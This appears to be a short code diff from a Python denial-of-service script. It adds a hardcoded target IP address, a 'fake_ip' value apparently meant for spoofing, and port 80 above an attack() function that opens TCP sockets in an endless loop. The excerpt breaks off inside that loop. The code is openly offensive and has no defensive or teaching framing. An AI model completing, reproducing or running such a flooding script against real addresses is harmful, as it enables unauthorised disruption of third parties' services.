@@ -1,5 +1,12 @@
 import socket
 import threading
+
+
+target = '151.106.117.95'
+fake_ip = '182.21.20.32'
+port = 80
+
+
 def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
